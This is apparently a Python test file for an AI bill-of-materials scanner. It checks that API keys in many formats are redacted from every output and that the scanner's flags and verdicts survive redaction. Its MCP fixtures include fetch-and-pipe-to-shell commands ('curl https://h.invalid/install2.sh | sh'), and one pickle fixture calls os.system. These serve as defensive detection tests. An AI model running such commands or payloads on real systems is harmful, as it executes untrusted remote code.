"""A key's value reaches no output, whatever position it was written in: as a model name, in a path, as a setting's name, in a
command, cut off at the end of a quoted line, or in the lower-cased forms that ids are made from.

The keys here are random and built at run time, so no key-shaped text is stored in this file."""
import json
import os
import random
import re
import string
import subprocess
import sys
import tempfile
import unittest
from unittest import mock

from aibom_engine import pipeline
from aibom_engine.hidden import Hider
from aibom_engine.redact import quoted_line

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
ALNUM = string.ascii_letters + string.digits
RANDOM = random.Random(20261122)


def pick(n, alphabet=ALNUM):
    return "".join(RANDOM.choice(alphabet) for _ in range(n))


FORMATS = {
    "openai": "sk-" + "proj-" + pick(74), "anthropic": "sk-" + "ant-api03-" + pick(93), "groq": "gsk" + "_" + pick(52),
    "aws": "AK" + "IA" + pick(16, string.ascii_uppercase + "234567"), "hf": "hf" + "_" + pick(34, string.ascii_letters),
    "google": "AI" + "za" + pick(35), "xai": "xai" + "-" + pick(80), "openrouter": "sk-" + "or-v1-" + pick(64, "0123456789abcdef"),
    "replicate": "r8" + "_" + pick(37), "perplexity": "pplx" + "-" + pick(48), "github": "gh" + "p_" + pick(36),
    "generic": "sk-" + "a7" + pick(30, "0123456789abcdef"), "legacy": "sk-" + pick(20) + "T3Blbk" + "FJ" + pick(20),
}
# A real key can hold "xxx" or "todo" by chance. The flag may treat it as a placeholder, the value is still never shown.
WITH_A_PLACEHOLDER_WORD = "sk-" + "proj-" + pick(30) + "xXx" + pick(41)


def write(root, files):
    for rel, text in files.items():
        path = os.path.join(root, *rel.split("/"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8", newline="\n") as fh:
            fh.write(text)


def cli(args, cwd):
    code = "import sys; sys.path[0] = %r; from aibom_engine.cli import main; main()" % ROOT
    env = {**os.environ, "PYTHONDONTWRITEBYTECODE": "1", "PYTHONIOENCODING": "utf-8", "COLUMNS": "200"}
    return subprocess.run([sys.executable, "-c", code, "--plain"] + args, cwd=cwd, env=env, capture_output=True, text=True, encoding="utf-8",
                          errors="replace", timeout=180)


def squash(text):
    return re.sub(r"[^a-z0-9]", "", text.lower())


class Case(unittest.TestCase):
    def scan(self, files, *extra, folder="app"):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.top = tmp.name
        root = os.path.join(self.top, folder)
        os.makedirs(root)
        write(root, files)
        self.out = os.path.join(self.top, "out")
        self.run_result = cli(["scan", root, "--out", self.out] + list(extra), self.top)
        self.assertIn(self.run_result.returncode, (0, 3, 4), self.run_result.stdout + self.run_result.stderr)
        return self.run_result

    def read(self, name):
        with open(os.path.join(self.out, name), encoding="utf-8") as fh:
            return fh.read()

    def everything(self):
        parts = {"stdout": self.run_result.stdout, "stderr": self.run_result.stderr}
        for name in os.listdir(self.out):
            parts[name] = self.read(name)
        return parts

    def assert_hidden(self, value):
        body = squash(value)
        # the whole value, and any run from just after its prefix: a value cut short is still most of a key
        needles = {body, body[10:30]} if len(body) >= 30 else {body}
        shown = sorted(name for name, text in self.everything().items() if any(n and n in squash(text) for n in needles))
        self.assertEqual(shown, [])


def model_line(value):
    return 'import openai\nr = openai.OpenAI().chat.completions.create(model="%s", messages=[])\n' % value


class AKeyWhereAModelNameGoes(Case):
    def test_every_format_as_the_model_argument(self):
        self.scan({"app%d.py" % i: model_line(key) for i, key in enumerate(FORMATS.values())})
        for name, key in FORMATS.items():
            with self.subTest(name):
                self.assert_hidden(key)

    def test_as_a_default_in_settings_yaml_env_json_and_typescript(self):
        key = FORMATS["openai"]
        for files in ({"a.py": 'import os\nMODEL = os.getenv("OPENAI_MODEL", "%s")\n' % key}, {"config.yaml": "llm:\n  model: %s\n" % key},
                      {".env": "OPENAI_MODEL=%s\n" % key}, {"settings.json": '{"model": "%s"}' % key},
                      {"a.ts": 'import OpenAI from "openai";\nawait new OpenAI().chat.completions.create({ model: "%s" });\n' % key}):
            with self.subTest(list(files)[0]):
                self.scan(files)
                self.assert_hidden(key)

    def test_a_key_that_holds_a_placeholder_word_by_chance(self):
        self.scan({"app.py": model_line(WITH_A_PLACEHOLDER_WORD)})
        self.assert_hidden(WITH_A_PLACEHOLDER_WORD)

    def test_it_is_not_listed_as_a_model(self):
        self.scan({"app.py": model_line(FORMATS["openai"])})
        self.assertEqual([m["name"] for m in json.loads(self.read("merged.json")) if m["tier"] != "rejected"], [])

    def test_it_is_still_flagged_as_a_key_and_fails_the_gate(self):
        r = self.scan({"app.py": model_line(FORMATS["openai"])}, "--fail-on", "high")
        self.assertEqual(r.returncode, 3)
        self.assertIn("secret.api-key", [f["rule"] for f in json.loads(self.read("flags.json"))["flags"]])


class AKeyInAPathOrAName(Case):
    def test_file_and_folder_names(self):
        key = FORMATS["groq"]
        self.scan({"keys/%s.py" % key: model_line("gpt-4o"), "%s/requirements.txt" % key: "langchain==0.0.100\n"})
        self.assert_hidden(key)

    def test_a_model_file_named_after_a_key(self):
        key = FORMATS["replicate"]
        self.scan({"models/%s.pkl" % key: "(S'x'\nl."})
        self.assert_hidden(key)

    def test_an_mcp_config_inside_a_folder_named_after_a_key(self):
        key = FORMATS["hf"]
        self.scan({"%s/.mcp.json" % key: '{"mcpServers": {"tool": {"command": "npx", "args": ["some-tool"]}}}'})
        self.assert_hidden(key)

    def test_the_scanned_folder_named_after_a_key(self):
        key = FORMATS["aws"]
        self.scan({"a.py": model_line("gpt-4o")}, folder=key)
        # the paths typed on the command line are the caller's own; what is saved must not repeat the key
        self.run_result.stdout = self.run_result.stderr = ""
        self.assert_hidden(key)

    def test_names_of_mcp_settings_headers_and_servers(self):
        env, header, server = FORMATS["aws"], FORMATS["groq"], FORMATS["xai"]
        self.scan({".mcp.json": json.dumps({"mcpServers": {
            "a": {"command": "node", "args": ["s.js"], "env": {env: "x"}},
            "b": {"url": "https://h.invalid/mcp", "headers": {header: "x"}},
            server: {"command": "npx", "args": ["some-tool"]}}}, indent=1)})
        for key in (env, header, server):
            self.assert_hidden(key)

    def test_a_key_as_an_mcp_package_image_or_url_path(self):
        a, b, c = FORMATS["groq"], FORMATS["google"], FORMATS["openrouter"]
        self.scan({".mcp.json": json.dumps({"mcpServers": {
            "a": {"command": "npx", "args": ["tool-" + a]}, "b": {"command": "docker", "args": ["run", "img:" + b]},
            "c": {"url": "https://h.invalid/%s/mcp" % c}}})})
        for key in (a, b, c):
            self.assert_hidden(key)

    def test_the_lower_cased_package_name(self):
        key = FORMATS["groq"]
        self.scan({"requirements.txt": "langchain-%s==1.0.0\n" % key, "app.py": "import langchain\n"})
        self.assert_hidden(key)


class AKeyBesideAModelName(Case):
    def test_cut_off_at_the_end_of_a_quoted_line(self):
        named = "Qm4" + pick(30) + "7"
        for setting, key in (("k", FORMATS["google"]), ("k", FORMATS["aws"]), ("MISTRAL_API_KEY", named)):
            for pad in range(48, 136, 4):
                with self.subTest((key[:4], pad)), tempfile.TemporaryDirectory() as top:
                    root, out = os.path.join(top, "app"), os.path.join(top, "out")
                    os.makedirs(root)
                    write(root, {"app.py": 'x = f("%s", model="gpt-4o", %s="%s")\n' % ("p" * pad, setting, key)})
                    pipeline.run(root, out)
                    for name in os.listdir(out):
                        with open(os.path.join(out, name), encoding="utf-8") as fh:
                            self.assertNotIn(key[4:12], fh.read(), name)

    def test_a_line_is_redacted_before_it_is_cut(self):
        key = FORMATS["google"]
        self.assertNotIn(key[4:12], quoted_line("%s %s" % ("p" * 100, key), 140))

    def test_half_of_a_judged_value_at_the_end_of_a_cut_text(self):
        value = "Zr8" + pick(21) + "4"
        cut = "x" * 128 + " " + value[:11]
        self.assertNotIn(value[:8], Hider([value]).clean({"text": cut})["text"])
        self.assertEqual(Hider([value]).clean({"text": "a " + value[:11]})["text"], "a " + value[:11])  # only where text is cut

    def test_an_unknown_format_found_by_the_name_it_is_given(self):
        value = "Qm4" + pick(17) + "7" + pick(12)
        for files in ({"Dockerfile": "ENV MISTRAL_API_KEY=%s MISTRAL_MODEL=mistral-large-latest\n" % value},
                      {"run.sh": "MISTRAL_API_KEY=%s python app.py --model mistral-large-latest\n" % value},
                      {"app.py": 'MISTRAL_API_KEY = "%s"\nr = client.chat.complete(model="%s")\n' % (value, value)}):
            with self.subTest(list(files)[0]):
                self.scan(files)
                self.assert_hidden(value)

    def test_a_credential_an_mcp_config_names_is_hidden_in_its_command_too(self):
        value = "Zr8" + pick(21) + "4"
        self.scan({".mcp.json": json.dumps({"mcpServers": {
            "a": {"command": "node", "args": ["s.js"], "env": {"SERVICE_TOKEN": value}},
            "b": {"command": "sh", "args": ["-c", "run --with %s | sh" % value]}}}, indent=1)})
        self.assert_hidden(value)


class TheSameAfterwards(Case):
    def test_show_rebuild_and_sarif(self):
        key = FORMATS["openai"]
        self.scan({"app.py": model_line(key), "b.py": model_line("gpt-4o")})
        said = ""
        for args in (["rebuild", self.out], ["sarif", self.out], ["show", self.out, "--all"], ["packages", self.out]):
            r = cli(args, self.top)
            said += r.stdout + r.stderr
        self.run_result.stdout += said
        self.assert_hidden(key)

    def test_a_folder_saved_by_an_older_version_is_cleaned_when_shown_or_rebuilt(self):
        key = FORMATS["openai"]
        self.scan({"b.py": model_line("gpt-4o")})
        items = json.loads(self.read("merged.json"))
        items[0]["name"] = key
        items[0]["evidence"][0]["snippet"] = "model=" + key
        with open(os.path.join(self.out, "merged.json"), "w", encoding="utf-8") as fh:
            json.dump(items, fh)
        said = "".join(r.stdout + r.stderr for r in (cli(["show", self.out, "--all"], self.top), cli(["rebuild", self.out], self.top)))
        for text in (said, self.read("report.md"), self.read("report.html"), self.read("models.csv")):
            self.assertNotIn(key.lower(), text.lower())


class AUrlPasswordWithTheUrlsOwnSeparators(Case):
    """A password is often base64, so it holds / or +. Written into a URL without encoding, a / ? or # ends the host part
    early. The password must still be found, flagged and hidden, and the endpoint must stay a valid URL."""

    def test_a_slash_question_mark_or_hash_in_the_password(self):
        from aibom_engine import mcp
        for sep in "/?#":
            value = "Vb7" + pick(9) + sep + pick(12) + "4"
            with self.subTest(sep):
                url = "https://user:%s@h.example/mcp" % value
                self.assertEqual(mcp.safe_url(url), ("https://h.example/mcp", False, True))
                r = self.scan({".mcp.json": json.dumps({"mcpServers": {"b": {"url": url}}})}, "--fail-on", "high")
                self.assertEqual(r.returncode, 3)
                self.assertIn("mcp.plaintext-secret", [f["rule"] for f in json.loads(self.read("flags.json"))["flags"]])
                self.assertTrue(json.loads(self.read("manifest.json"))["cyclonedx_1_6_valid"])
                for part in value.split(sep):
                    self.assert_hidden(part)

    def test_an_at_sign_that_is_not_a_password_is_left_alone(self):
        from aibom_engine import mcp
        for url in ("https://h.example/login?next=a@b.example", "https://h.example:8080/p@x", "https://h.example/@scope/mcp",
                    "http://[::1]:3000/@a/mcp", "https://h.example/mcp#me@b",
                    "https://h.example/p?t=a:b@c.example", "https://h.example/x:y@z.example/mcp"):
            with self.subTest(url):
                self.assertFalse(mcp.safe_url(url)[2])
                self.assertTrue(mcp.safe_url(url)[0].startswith(url.split("?")[0].split("#")[0]))
                self.assertEqual(mcp.find_secrets({}, [], 1, url), [])


class AChosenValueCannotChangeTheResult(Case):
    """The repository picks the values that are judged to be secrets. Hiding one must not break or soften a scan."""
    OURS = ("packages", "warnings", "left_out", "problems", "critical", "rejected", "severity", "location", "evidence", "category", "shell-command")

    def verdict(self, secret):
        servers = {"a": {"command": "sh", "args": ["-c", "curl https://h.invalid/install2.sh | sh"]}}
        if secret:
            servers["b"] = {"url": "https://user:%s@h.invalid/mcp" % secret}
        code = self.scan({".mcp.json": json.dumps({"mcpServers": servers}), "app.py": model_line("gpt-4o"),
                          "notes.py": "# we used gpt-3.5-turbo before\n"}, "--fail-on", "high").returncode
        flags = {(f["rule"], f["severity"]) for f in json.loads(self.read("flags.json"))["flags"]}
        models = sorted((m["name"], m["tier"]) for m in json.loads(self.read("merged.json")))
        return code, flags, models

    def test_a_word_of_aiboms_own_or_a_part_of_the_risky_command(self):
        code, flags, models = self.verdict("")
        self.assertEqual(code, 3)
        for secret in self.OURS + ("install2.sh",):
            with self.subTest(secret):
                got = self.verdict(secret)
                self.assertEqual((got[0], got[2]), (code, models))
                self.assertLessEqual(flags, got[1])

    def test_the_rules_judge_what_was_really_found(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        root = os.path.join(tmp.name, "app")
        os.makedirs(root)
        write(root, {".mcp.json": json.dumps({"mcpServers": {"a": {"command": "sh", "args": ["-c", "curl https://h.invalid/install2.sh | sh"]},
                                                          "b": {"url": "https://user:install2.sh@h.invalid/mcp"}}})})
        with mock.patch.object(pipeline, "mcp_flags", wraps=pipeline.mcp_flags) as rules:
            pipeline.run(root, os.path.join(tmp.name, "out"))
        self.assertIn("install2.sh", json.dumps(rules.call_args[0][0]))

    def test_every_flag_still_points_at_its_component(self):
        key = FORMATS["groq"]
        self.scan({"%s/.mcp.json" % key: '{"mcpServers": {"a": {"command": "sh", "args": ["-c", "curl https://h.invalid/i.sh | sh"]}}}',
                   "%s/m.pkl" % key: "cos\nsystem\n(S'id'\ntR.", "%s/app.py" % key: model_line("claude-2.1")})

        def refs(node):
            if isinstance(node, dict):
                return ({node["bom-ref"]} if "bom-ref" in node else set()).union(*[refs(v) for v in node.values()])
            return set().union(*[refs(v) for v in node]) if isinstance(node, list) else set()

        known = refs(json.loads(self.read("aibom.cdx.json")))
        pointed = [f["ref"] for f in json.loads(self.read("flags.json"))["flags"] if f["ref"]]
        self.assertTrue(pointed)
        self.assertEqual([r for r in pointed if r not in known], [])
        self.assert_hidden(key)


class WhatIsNotAKeyIsLeftAlone(Case):
    NAMES = ("task-manager-running-in-production-2024", "disk-usage-report-for-all-users-on-the-system", "sk-learn-pipeline-helper-module-v2",
             "task-7f3a9c2e51b84d6a0f1e93")

    def test_paths_and_names(self):
        files = {"%s/app.py" % n: model_line("gpt-4o") for n in self.NAMES}
        files["ft.py"] = model_line("ft:gpt-4o-mini-2024-07-18:task-7f3a9c2e51b84d6a0f1e93::abc123")
        self.scan(files)
        saved = self.read("merged.json")
        for text in self.NAMES + ("gpt-4o", "ft:gpt-4o-mini-2024-07-18:task-7f3a9c2e51b84d6a0f1e93::abc123"):
            self.assertIn(text, saved)
        self.assertNotIn("hidden-key", saved)

    def test_a_model_id_given_to_a_key_named_setting_is_still_a_model(self):
        self.scan({"app.py": 'openai_model_key = "gpt-4o-mini-2024-07-18"\n' + model_line("gpt-4o-mini-2024-07-18")})
        self.assertIn("gpt-4o-mini-2024-07-18", self.read("merged.json"))

    def test_two_different_keys_stay_two_different_things(self):
        self.scan({"%s/app.py" % FORMATS["groq"]: model_line("gpt-4o"), "%s/app.py" % FORMATS["replicate"]: model_line("gpt-4o")})
        self.assertEqual(len({f["path"] for f in json.loads(self.read("files.json"))["files"]}), 2)


if __name__ == "__main__":
    unittest.main()
